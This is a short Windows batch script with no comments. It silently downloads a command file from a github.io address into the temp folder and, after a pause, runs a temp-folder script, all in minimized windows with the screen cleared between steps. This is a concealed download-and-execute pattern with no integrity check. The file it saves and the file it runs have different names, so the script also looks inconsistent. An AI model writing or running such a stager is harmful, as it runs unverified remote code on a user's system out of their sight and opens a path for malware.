@echo off

cls
set eq_repo="https://suporteeq.github.io"

cls
start /min cmd /c "curl -s %eq_repo%/eq_run.txt -o %tmp%\eq_run.cmd"

cls
start /min cmd /c"TIMEOUT /T 10 >nul"

cls
start /min cmd /c %temp%\eq_screensaver.cmd

cls
